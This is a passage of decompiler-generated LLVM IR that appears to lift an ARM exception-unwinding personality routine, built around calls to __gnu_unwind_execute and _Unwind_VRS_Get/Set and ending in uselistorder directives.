  %v0_1825c = phi i32 [ %v0_1825c.pre, %._crit_edge ], [ %v0_18244, %bb153 ], [ %v0_18244, %.thread20 ]
  %v0_18404 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18258 = load i32, i32* @r5, align 4
  %v1_1825c = urem i32 %v0_1825c, 2
  %v1_18258 = mul i32 %v0_18258, 2
  %v3_18260 = and i32 %v1_18258, 2
  %v4_18260 = or i32 %v3_18260, %v1_1825c
  store i32 %v4_18260, i32* %r2.global-to-local, align 4
  %v7_18264 = icmp eq i32 %v4_18260, 1
  br i1 %v7_18264, label %dec_label_pc_183f8, label %dec_label_pc_1826c

dec_label_pc_1826c:                               ; preds = %bb154
  %v2_18264 = icmp eq i32 %v4_18260, 0
  br i1 %v2_18264, label %dec_label_pc_18270, label %dec_label_pc_18320

dec_label_pc_18270:                               ; preds = %dec_label_pc_1826c
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  br i1 %v2_18274, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18270
  %v0_18288119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18288

bb155:                                            ; preds = %dec_label_pc_18270
  %v2_18280 = icmp eq i32 %v0_18404, 0
  %v0_18288 = load i32, i32* @r7, align 4
  br i1 %v2_18280, label %dec_label_pc_18288, label %dec_label_pc_18600

dec_label_pc_18288:                               ; preds = %.thread, %bb155
  %v0_18288120 = phi i32 [ %v0_18288119, %.thread ], [ %v0_18288, %bb155 ]
  %v1_18288 = add i32 %v0_18288120, 4
  %v1_1828c = inttoptr i32 %v1_18288 to i32*
  %v2_1828c = load i32, i32* %v1_1828c, align 4
  %v2_18290 = icmp eq i32 %v2_1828c, 0
  br i1 %v2_18290, label %dec_label_pc_18298, label %dec_label_pc_181e4

dec_label_pc_18298:                               ; preds = %dec_label_pc_184ac, %dec_label_pc_18470, %dec_label_pc_18288, %dec_label_pc_181d8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_181d8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18288 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18470 ], [ %stack_var_-76.4, %dec_label_pc_184ac ]
  %v0_18298 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18298, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_182a0 = call i32 @__gnu_unwind_execute(i32 %v0_18298, %anon_struct_13* %tmp156)
  store i32 %v4_182a0, i32* %r0.global-to-local, align 4
  store i32 %v4_182a0, i32* %r5.global-to-local, align 4
  %v2_182a4 = icmp eq i32 %v4_182a0, 0
  br i1 %v2_182a4, label %dec_label_pc_182ac, label %dec_label_pc_18328

dec_label_pc_182ac:                               ; preds = %dec_label_pc_18298
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_182b0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_182b0, label %bb157, label %dec_label_pc_182bc

bb157:                                            ; preds = %dec_label_pc_182ac
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_182bc:                               ; preds = %dec_label_pc_182ac
  %v2_182bc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_182bc, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_182cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_182cc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_182d4 = call i32 @_Unwind_VRS_Get(i32 %v0_182cc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_182d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_182cc, i32* %r0.global-to-local, align 4
  %v5_182ec = call i32 @_Unwind_VRS_Set(i32 %v0_182cc, i32 %v0_182d8, i32 14, i32 %v0_182d8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_182ec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v4_182f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 32) to i32*), align 4
  %v0_182fc = load i32, i32* %r5.global-to-local, align 4
  %v0_18300 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18300, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_182f8, i32* %stack_var_-48, align 4
  %v5_18314 = call i32 @_Unwind_VRS_Set(i32 %v0_18300, i32 %v0_182fc, i32 15, i32 %v0_182fc, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_18320:                               ; preds = %dec_label_pc_1826c
  %v7_18320 = icmp eq i32 %v4_18260, 2
  br i1 %v7_18320, label %dec_label_pc_18338, label %dec_label_pc_18328

dec_label_pc_18328:                               ; preds = %dec_label_pc_18320, %dec_label_pc_1840c, %dec_label_pc_18298, %dec_label_pc_18600
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %bb157, %dec_label_pc_18638, %dec_label_pc_185c8, %bb166, %dec_label_pc_182bc, %dec_label_pc_18328
  %v1_18334 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18638 ], [ %v1_18334.pre, %dec_label_pc_185c8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_182bc ], [ 9, %dec_label_pc_18328 ]
  store i32 %v3_18148, i32* %r4.global-to-local, align 4
  store i32 %v6_18148, i32* %r5.global-to-local, align 4
  ret i32 %v1_18334

dec_label_pc_18338:                               ; preds = %dec_label_pc_18320
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  %v0_1833c = load i32, i32* @r7, align 4
  %v1_1833c = inttoptr i32 %v0_1833c to i32*
  %v2_1833c = load i32, i32* %v1_1833c, align 4
  %tmp206 = bitcast i32 %v2_1833c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18344 = bitcast float %tmp207 to i32
  store i32 %v1_18344, i32* @sl, align 4
  br i1 %v2_18274, label %dec_label_pc_1834c, label %dec_label_pc_184b8

dec_label_pc_1834c:                               ; preds = %dec_label_pc_18338
  %v2_1834c = icmp eq i32 %v0_18404, 0
  br i1 %v2_1834c, label %dec_label_pc_184a0, label %dec_label_pc_18354

dec_label_pc_18354:                               ; preds = %dec_label_pc_1834c
  %v2_18358 = icmp eq i32 %v1_18344, 0
  br i1 %v2_18358, label %dec_label_pc_18364.thread, label %bb159

dec_label_pc_18364.thread:                        ; preds = %dec_label_pc_18354
  br label %dec_label_pc_185c8

bb159:                                            ; preds = %dec_label_pc_18354
  br i1 %v3_1835c, label %dec_label_pc_1836c, label %dec_label_pc_184a0

dec_label_pc_1836c:                               ; preds = %bb159
  %v1_1836c = add i32 %v0_1833c, 4
  store i32 %v1_1836c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1837c = load i32, i32* @r8, align 4
  %v1_1837c = add i32 %v0_1837c, 88
  store i32 %v1_1837c, i32* %sb.global-to-local, align 4
  store i32 %v1_1836c, i32* @r4, align 4
  br label %dec_label_pc_183a0

dec_label_pc_18390:                               ; preds = %bb161
  %v1_18390 = add i32 %v0_18390, 1
  store i32 %v1_18390, i32* @r5, align 4
  %v1_18394 = load i32, i32* @sl, align 4
  %v9_18394 = icmp eq i32 %v1_18390, %v1_18394
  %v0_18398 = load i32, i32* @r4, align 4
  %v1_18398 = add i32 %v0_18398, 4
  store i32 %v1_18398, i32* @r4, align 4
  br i1 %v9_18394, label %dec_label_pc_185c8, label %dec_label_pc_18390.dec_label_pc_183a0_crit_edge

dec_label_pc_18390.dec_label_pc_183a0_crit_edge:  ; preds = %dec_label_pc_18390
  %v0_183ac.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_183a0

dec_label_pc_183a0:                               ; preds = %dec_label_pc_18390.dec_label_pc_183a0_crit_edge, %dec_label_pc_1836c
  %v0_183ac = phi i32 [ %v0_183ac.pre, %dec_label_pc_18390.dec_label_pc_183a0_crit_edge ], [ %v1_1837c, %dec_label_pc_1836c ]
  %v1_183b0 = phi i32 [ %v1_18398, %dec_label_pc_18390.dec_label_pc_183a0_crit_edge ], [ %v1_1836c, %dec_label_pc_1836c ]
  %v1_183a0 = inttoptr i32 %v1_183b0 to i32*
  %v2_183a0 = load i32, i32* %v1_183a0, align 4
  %v2_183a4 = icmp eq i32 %v2_183a0, 0
  store i32 %v0_183ac, i32* %forced_unwind_-44, align 4
  br i1 %v2_183a4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_183a0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_183a0, %bb160
  %v0_183b4 = load i32, i32* @r8, align 4
  store i32 %v0_183b4, i32* %r0.global-to-local, align 4
  store i32 %v2_18440, i32* %r2.global-to-local, align 4
  %v4_183c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 100) to i32*), align 4
  store i32 99280, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_183c4)
  %v0_183d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_183d0 = icmp eq i32 %v0_183d0, 0
  %v0_18390 = load i32, i32* @r5, align 4
  br i1 %v2_183d0, label %dec_label_pc_18390, label %dec_label_pc_183d8

dec_label_pc_183d8:                               ; preds = %bb161
  %v1_183d8 = load i32, i32* @sl, align 4
  %v9_183d8 = icmp eq i32 %v0_18390, %v1_183d8
  br i1 %v9_183d8, label %dec_label_pc_185c8, label %dec_label_pc_183e0

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183d8
  %v0_183e0 = load i32, i32* @r7, align 4
  %v1_183e0 = inttoptr i32 %v0_183e0 to i32*
  %v2_183e0 = load i32, i32* %v1_183e0, align 4
  %v1_183e4 = icmp slt i32 %v2_183e0, 0
  %v0_183ec.pre = load i32, i32* @r6, align 4
  br i1 %v1_183e4, label %dec_label_pc_183ec, label %dec_label_pc_184ac

dec_label_pc_183ec:                               ; preds = %dec_label_pc_183e0, %dec_label_pc_184a4
  %v0_183ec = phi i32 [ %storemerge, %dec_label_pc_184a4 ], [ %v0_183ec.pre, %dec_label_pc_183e0 ]
  store i32 %v0_183ec, i32* %r0.global-to-local, align 4
  %v1_183f0 = add i32 %v0_183ec, 4
  store i32 %v1_183f0, i32* @r6, align 4
  br label %dec_label_pc_184ac

dec_label_pc_183f8:                               ; preds = %bb154
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  br i1 %v2_18274, label %dec_label_pc_18404, label %dec_label_pc_184f0

dec_label_pc_18404:                               ; preds = %dec_label_pc_183f8
  %v2_18404 = icmp eq i32 %v0_18404, 0
  br i1 %v2_18404, label %dec_label_pc_18470, label %dec_label_pc_1840c

dec_label_pc_1840c:                               ; preds = %dec_label_pc_18404
  %v0_1840c = load i32, i32* @r7, align 4
  %v1_1840c = add i32 %v0_1840c, 4
  %v2_1840c = inttoptr i32 %v1_1840c to i32*
  %v3_1840c = load i32, i32* %v2_1840c, align 4
  %v7_18410 = icmp eq i32 %v3_1840c, -2
  store i32 %v1_1840c, i32* %r2.global-to-local, align 4
  br i1 %v7_18410, label %dec_label_pc_18328, label %dec_label_pc_1841c

dec_label_pc_1841c:                               ; preds = %dec_label_pc_1840c
  %v0_1841c = load i32, i32* @r8, align 4
  %v1_1841c = add i32 %v0_1841c, 88
  %v7_18420 = icmp eq i32 %v3_1840c, -1
  store i32 %v1_1841c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18420, label %dec_label_pc_18464, label %dec_label_pc_1842c

dec_label_pc_1842c:                               ; preds = %dec_label_pc_1841c
  %v2_18430 = icmp eq i32 %v3_1840c, 0
  br i1 %v2_18430, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1842c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1842c, %bb162
  store i32 %v0_1841c, i32* %r0.global-to-local, align 4
  store i32 %v2_18440, i32* %r2.global-to-local, align 4
  %v4_1844c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 100) to i32*), align 4
  store i32 99416, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1844c)
  %v0_18458 = load i32, i32* %r0.global-to-local, align 4
  %v2_18458 = icmp eq i32 %v0_18458, 0
  br i1 %v2_18458, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18464.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18464

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18470

dec_label_pc_18464:                               ; preds = %.thread25, %dec_label_pc_1841c
  %v3_18464 = phi i32 [ %v3_18464.pr, %.thread25 ], [ %v1_1841c, %dec_label_pc_1841c ]
  %v2_18468 = icmp eq i32 %v3_18464, 0
  br i1 %v2_18468, label %dec_label_pc_18470, label %dec_label_pc_185c8

dec_label_pc_18470:                               ; preds = %bb164, %dec_label_pc_1851c, %dec_label_pc_184f0, %dec_label_pc_18464, %dec_label_pc_18404
  %v0_18470 = load i32, i32* @r7, align 4
  %v1_18470 = add i32 %v0_18470, 8
  %v1_181d8 = inttoptr i32 %v1_18470 to i32*
  %v2_181d8 = load i32, i32* %v1_181d8, align 4
  %v2_181dc = icmp eq i32 %v2_181d8, 0
  br i1 %v2_181dc, label %dec_label_pc_18298, label %dec_label_pc_181e4.preheader

dec_label_pc_18478:                               ; preds = %entry
  %v3_18478 = udiv i32 %v2_1816c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18488 = mul nuw nsw i32 %v3_18478, 4
  %v3_1848c = mul i32 %v2_1816c, 65536
  %v2_18490 = add i32 %v6_18488, %v4_1816c
  store i32 %v3_1848c, i32* %v4_1818c, align 8
  br label %dec_label_pc_181b4

dec_label_pc_184a0:                               ; preds = %bb159, %dec_label_pc_1834c
  %v1_184a0 = add i32 %v0_1833c, 4
  br label %dec_label_pc_184a4

dec_label_pc_184a4:                               ; preds = %dec_label_pc_184e4, %dec_label_pc_184a0
  %v0_184a4 = phi i32 [ %v2_184e4, %dec_label_pc_184e4 ], [ %v2_1833c, %dec_label_pc_184a0 ]
  %storemerge = phi i32 [ %v4_184e4, %dec_label_pc_184e4 ], [ %v1_184a0, %dec_label_pc_184a0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_184a4 = icmp slt i32 %v0_184a4, 0
  br i1 %v1_184a4, label %dec_label_pc_183ec, label %dec_label_pc_184ac

dec_label_pc_184ac:                               ; preds = %dec_label_pc_183e0, %dec_label_pc_184a4, %dec_label_pc_185b8, %dec_label_pc_183ec
  %v0_184b0 = phi i32 [ %v1_183f0, %dec_label_pc_183ec ], [ %storemerge, %dec_label_pc_184a4 ], [ %v1_185bc, %dec_label_pc_185b8 ], [ %v0_183ec.pre, %dec_label_pc_183e0 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_183ec ], [ %stack_var_-76.2.ph3175, %dec_label_pc_184a4 ], [ %v1_185b8, %dec_label_pc_185b8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_183e0 ]
  %v0_184ac = load i32, i32* @sl, align 4
  %v3_184ac = mul i32 %v0_184ac, 4
  %v2_184b0 = add i32 %v3_184ac, %v0_184b0
  %v1_181d865 = inttoptr i32 %v2_184b0 to i32*
  %v2_181d866 = load i32, i32* %v1_181d865, align 4
  %v2_181dc68 = icmp eq i32 %v2_181d866, 0
  br i1 %v2_181dc68, label %dec_label_pc_18298, label %dec_label_pc_181e4.preheader.lr.ph

dec_label_pc_184b8:                               ; preds = %dec_label_pc_18338
  %v0_184c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_184c8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_184d0 = load i32, i32* @r8, align 4
  %v1_184d0 = add i32 %v0_184d0, 32
  %v2_184d0 = inttoptr i32 %v1_184d0 to i32*
  %v3_184d0 = load i32, i32* %v2_184d0, align 4
  store i32 %v3_184d0, i32* @r4, align 4
  %v5_184d4 = call i32 @_Unwind_VRS_Get(i32 %v0_184c8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_184d4, i32* %r0.global-to-local, align 4
  %v3_184d8 = load i32, i32* %stack_var_-48, align 4
  %v0_184dc = load i32, i32* @r4, align 4
  %v9_184dc = icmp eq i32 %v0_184dc, %v3_184d8
  br i1 %v9_184dc, label %dec_label_pc_18584, label %dec_label_pc_184b8.dec_label_pc_184e4_crit_edge

dec_label_pc_184b8.dec_label_pc_184e4_crit_edge:  ; preds = %dec_label_pc_184b8
  %v0_184e4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_184e4

dec_label_pc_184e4:                               ; preds = %dec_label_pc_184b8.dec_label_pc_184e4_crit_edge, %dec_label_pc_18584
  %v0_184e4 = phi i32 [ %v0_184e4.pre, %dec_label_pc_184b8.dec_label_pc_184e4_crit_edge ], [ %v1_18588, %dec_label_pc_18584 ]
  %v1_184e4 = inttoptr i32 %v0_184e4 to i32*
  %v2_184e4 = load i32, i32* %v1_184e4, align 4
  %v4_184e4 = add i32 %v0_184e4, 4
  store i32 %v4_184e4, i32* @r7, align 4
  br label %dec_label_pc_184a4

dec_label_pc_184f0:                               ; preds = %dec_label_pc_183f8
  %v0_18500 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18500, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18508 = load i32, i32* @r8, align 4
  %v1_18508 = add i32 %v0_18508, 32
  %v2_18508 = inttoptr i32 %v1_18508 to i32*
  %v3_18508 = load i32, i32* %v2_18508, align 4
  store i32 %v3_18508, i32* @r4, align 4
  %v5_1850c = call i32 @_Unwind_VRS_Get(i32 %v0_18500, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1850c, i32* %r0.global-to-local, align 4
  %v3_18510 = load i32, i32* %stack_var_-48, align 4
  %v0_18514 = load i32, i32* @r4, align 4
  %v9_18514 = icmp eq i32 %v0_18514, %v3_18510
  br i1 %v9_18514, label %dec_label_pc_1851c, label %dec_label_pc_18470

dec_label_pc_1851c:                               ; preds = %dec_label_pc_184f0
  %v0_1851c = load i32, i32* @r8, align 4
  %v1_1851c = add i32 %v0_1851c, 40
  %v2_1851c = inttoptr i32 %v1_1851c to i32*
  %v3_1851c = load i32, i32* %v2_1851c, align 4
  %v1_18520 = load i32, i32* @r7, align 4
  %v9_18520 = icmp eq i32 %v3_1851c, %v1_18520
  br i1 %v9_18520, label %dec_label_pc_18528, label %dec_label_pc_18470

dec_label_pc_18528:                               ; preds = %dec_label_pc_1851c
  %v1_18528 = inttoptr i32 %v3_1851c to i32*
  %v2_18528 = load i32, i32* %v1_18528, align 4
  %v1_1852c = and i32 %v2_18528, 1073741824
  %v2_1852c = icmp eq i32 %v1_1852c, 0
  br i1 %v2_1852c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18528
  %v2_18530 = or i32 %v2_18528, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18528
  %tmp208 = bitcast i32 %v2_18528 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18534 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18538 = phi i32 [ %v2_18668, %.thread28 ], [ %v2_18668, %bb169 ], [ %v3_1851c, %bb165 ], [ %v3_1851c, %.thread26 ]
  %v0_18538 = phi i32 [ %v2_18678, %.thread28 ], [ %v2_18674, %bb169 ], [ %v2_18530, %bb165 ], [ %v2_18534, %.thread26 ]
  %v2_18538 = add i32 %v0_18538, %v1_18538
  store i32 %v2_18538, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18550 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18550, i32* %r0.global-to-local, align 4
  %v5_18558 = call i32 @_Unwind_VRS_Set(i32 %v0_18550, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18550, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18570 = load i32, i32* @r8, align 4
  store i32 %v0_18570, i32* %stack_var_-48, align 4
  %v5_18578 = call i32 @_Unwind_VRS_Set(i32 %v0_18550, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_18584:                               ; preds = %dec_label_pc_184b8
  %v0_18584 = load i32, i32* @r8, align 4
  %v1_18584 = add i32 %v0_18584, 40
  %v2_18584 = inttoptr i32 %v1_18584 to i32*
  %v3_18584 = load i32, i32* %v2_18584, align 4
  %v1_18588 = load i32, i32* @r7, align 4
  %v9_18588 = icmp eq i32 %v3_18584, %v1_18588
  br i1 %v9_18588, label %dec_label_pc_18590, label %dec_label_pc_184e4

dec_label_pc_18590:                               ; preds = %dec_label_pc_18584
  %v1_18594 = add i32 %v3_18584, 4
  store i32 %v1_18594, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1859c = add i32 %v0_18584, 44
  %v3_1859c = inttoptr i32 %v2_1859c to i32*
  store i32 0, i32* %v3_1859c, align 4
  %v0_185a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_185a0 = load i32, i32* @r8, align 4
  %v2_185a0 = add i32 %v1_185a0, 48
  %v3_185a0 = inttoptr i32 %v2_185a0 to i32*
  store i32 %v0_185a0, i32* %v3_185a0, align 4
  %v0_185a4 = load i32, i32* @sl, align 4
  %v1_185a4 = load i32, i32* @r8, align 4
  %v2_185a4 = add i32 %v1_185a4, 40
  %v3_185a4 = inttoptr i32 %v2_185a4 to i32*
  store i32 %v0_185a4, i32* %v3_185a4, align 4
  %v0_185a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_185a8 = load i32, i32* @r8, align 4
  %v2_185a8 = add i32 %v1_185a8, 52
  %v3_185a8 = inttoptr i32 %v2_185a8 to i32*
  store i32 %v0_185a8, i32* %v3_185a8, align 4
  %v0_185ac = load i32, i32* @r7, align 4
  %v1_185ac = inttoptr i32 %v0_185ac to i32*
  %v2_185ac = load i32, i32* %v1_185ac, align 4
  %v1_185b0 = icmp slt i32 %v2_185ac, 0
  br i1 %v1_185b0, label %dec_label_pc_185b8, label %dec_label_pc_18664

dec_label_pc_185b8:                               ; preds = %dec_label_pc_18590
  %v0_185b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_185b8 = add i32 %v0_185b8, -3
  store i32 %v1_185b8, i32* %r2.global-to-local, align 4
  %v0_185bc = load i32, i32* %r0.global-to-local, align 4
  %v1_185bc = add i32 %v0_185bc, 4
  store i32 %v1_185bc, i32* @r6, align 4
  br label %dec_label_pc_184ac

dec_label_pc_185c8:                               ; preds = %dec_label_pc_183d8, %dec_label_pc_18464, %dec_label_pc_18390, %dec_label_pc_18364.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_185d8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_185d8, i32* %r0.global-to-local, align 4
  %v5_185e0 = call i32 @_Unwind_VRS_Get(i32 %v0_185d8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_185e4 = load i32, i32* @r7, align 4
  %v1_185e4 = load i32, i32* @r8, align 4
  %v2_185e4 = add i32 %v1_185e4, 40
  %v3_185e4 = inttoptr i32 %v2_185e4 to i32*
  store i32 %v0_185e4, i32* %v3_185e4, align 4
  %v3_185e8 = load i32, i32* %stack_var_-48, align 4
  %v3_185ec = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_185ec, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_185f4 = load i32, i32* @r8, align 4
  %v2_185f4 = add i32 %v1_185f4, 32
  %v3_185f4 = inttoptr i32 %v2_185f4 to i32*
  store i32 %v3_185e8, i32* %v3_185f4, align 4
  %v0_185f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_185f8 = load i32, i32* @r8, align 4
  %v2_185f8 = add i32 %v1_185f8, 36
  %v3_185f8 = inttoptr i32 %v2_185f8 to i32*
  store i32 %v0_185f8, i32* %v3_185f8, align 4
  %v1_18334.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_18600:                               ; preds = %bb155
  %v1_18600 = inttoptr i32 %v0_18288 to i32*
  %v2_18600 = load i32, i32* %v1_18600, align 4
  %v1_18604 = add i32 %v0_18288, 4
  %v1_18608 = and i32 %v2_18600, 1073741824
  %v2_18608 = icmp eq i32 %v1_18608, 0
  %v2_1860c = or i32 %v2_18600, -2147483648
  %tmp210 = bitcast i32 %v2_18600 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18610 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18608, i32 %v2_18610, i32 %v2_1860c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18614 = load i32, i32* @r8, align 4
  %v2_18614 = add i32 %v1_18614, 56
  %v3_18614 = inttoptr i32 %v2_18614 to i32*
  store i32 %v1_18604, i32* %v3_18614, align 4
  %v0_18618 = load i32, i32* @r8, align 4
  store i32 %v0_18618, i32* %r0.global-to-local, align 4
  %v4_18624 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 28) to i32*), align 4
  store i32 99888, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18624)
  %v0_18630 = load i32, i32* %r0.global-to-local, align 4
  %v2_18630 = icmp eq i32 %v0_18630, 0
  br i1 %v2_18630, label %dec_label_pc_18328, label %dec_label_pc_18638

dec_label_pc_18638:                               ; preds = %dec_label_pc_18600
  %v0_18638 = load i32, i32* %r4.global-to-local, align 4
  %v1_18638 = load i32, i32* @r7, align 4
  %v2_18638 = add i32 %v1_18638, %v0_18638
  store i32 %v2_18638, i32* %stack_var_-48, align 4
  %v0_18648 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18648, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18658 = call i32 @_Unwind_VRS_Set(i32 %v0_18648, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_18664:                               ; preds = %dec_label_pc_18590
  %v0_18664 = load i32, i32* @sl, align 4
  %v3_18664 = mul i32 %v0_18664, 4
  %v0_18668 = load i32, i32* %r0.global-to-local, align 4
  %v2_18668 = add i32 %v0_18668, %v3_18664
  %v3_18668 = inttoptr i32 %v2_18668 to i32*
  %v4_18668 = load i32, i32* %v3_18668, align 4
  %v1_1866c = and i32 %v4_18668, 1073741824
  %v2_1866c = icmp eq i32 %v1_1866c, 0
  br i1 %v2_1866c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18664
  %v2_18674 = or i32 %v4_18668, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18664
  %tmp212 = bitcast i32 %v4_18668 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18678 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18668, { 2, 1, 0 }
  uselistorder i32 %v1_185bc, { 1, 0 }
  uselistorder i32 %v1_185b8, { 1, 0 }
  uselistorder i32 %v1_18588, { 1, 0 }
  uselistorder i32 %v0_18550, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1851c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_184e4, { 1, 0 }
  uselistorder i32 %v0_184e4, { 1, 0 }
  uselistorder i32 %v2_181d866, { 1, 0 }
  uselistorder i32 %v2_184b0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_181d8, { 1, 0 }
  uselistorder i32 %v1_18470, { 1, 0 }
  uselistorder i32 %v3_1840c, { 2, 0, 1 }
  uselistorder i32 %v0_183ec, { 1, 0 }
  uselistorder i32 %v0_183ec.pre, { 1, 0 }
  uselistorder i32 %v1_18344, { 1, 0 }
  uselistorder i32 %v2_1833c, { 1, 0 }
  uselistorder i32 %v0_182cc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1828c, { 1, 0 }
  uselistorder i32 %v1_18288, { 1, 0 }
  uselistorder i32 %v0_18288, { 1, 0, 2 }
  uselistorder i32 %v4_18260, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18404, { 1, 2, 0 }
  uselistorder i32 %v0_18238, { 1, 0 }
  uselistorder i32 %v3_18234, { 1, 0, 2 }
  uselistorder i32 %v1_18208, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18440, { 1, 0 }
  uselistorder i1 %v2_18274, { 1, 0, 2 }
  uselistorder i32 %v1_18178, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
